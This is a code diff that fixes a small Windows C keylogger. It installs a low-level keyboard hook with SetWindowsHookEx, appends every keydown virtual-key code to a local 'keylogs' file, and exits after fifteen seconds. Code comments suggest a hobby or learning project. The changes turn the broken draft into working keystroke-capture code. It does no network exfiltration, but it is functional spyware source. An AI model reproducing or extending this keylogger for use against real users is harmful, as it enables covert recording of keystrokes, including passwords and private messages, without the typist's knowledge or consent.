@@ -4,8 +4,11 @@
 #include <winuser.h>
 
 FILE *outputFile;
+HHOOK hKeyHook;
+clock_t start;
+clock_t duration;
 
-void log(char s1[]) {
+void logA(char s1[]) {
   FILE *file = fopen("Filename", "a+");
 
   static int i = 0;
@@ -28,24 +31,29 @@ void writeToFile(DWORD code) {
 LRESULT CALLBACK LowLevelKeyboardProc(int code, WPARAM messageIdentifier,
                                       LPARAM hookStruct) {
   // LowLevelKeyboardProc is called by the system on a new keyboard input event
-  KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
+  KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)hookStruct;
 
   if (messageIdentifier == WM_KEYDOWN) {
     DWORD vCode = pKeyBoard->vkCode;
     writeToFile(vCode);
   }
 
+  duration = (clock() - start) / CLOCKS_PER_SEC;
+  if (duration > 15) {
+    UnhookWindowsHookEx(hKeyHook);
+    fclose(outputFile);
+    exit(0);
+  }
+
   return CallNextHookEx(
-      NULL, code, messageIdentifier,
+      hKeyHook, code, messageIdentifier,
       hookStruct); // I think it just lets the original program continue running
 }
 
 HHOOK setHook() {
-  Process curProcess = Process.GetCurrentProcess();
-  ProcessModule curModule = curProcess.MainModule;
 
   return SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc,
-                          GetModuleHandle(curModule.ModuleName), 0)
+                          GetModuleHandle(NULL), 0);
   /*
    MSG msg;
 
@@ -57,21 +65,17 @@ HHOOK setHook() {
 }
 
 void keyloggerMain() {
-  clock_t start = clock();
-  clock_t duration = (clock() - clock()) / CLOCKS_PER_SEC;
+  start = clock();
+  duration = (clock() - clock()) / CLOCKS_PER_SEC;
   MSG msg;
-  FILE *file = fopen("keylogs", "a+");
+  outputFile = fopen("keylogs", "a+");
 
-  HHOOK hKeyHook = setHook();
+  hKeyHook = setHook();
 
   GetMessage(&msg, NULL, 0, 0);
-
-  while (duration < 15) {
-    duration = (clock() - start) / CLOCKS_PER_SEC;
-  }
-
-  UnhookWindowsHookEx(hKeyHook);
-  fclose(file);
 }
 
-int main(void) { keyloggerMain() return 0; }
+int main() {
+  keyloggerMain();
+  return 0;
+}
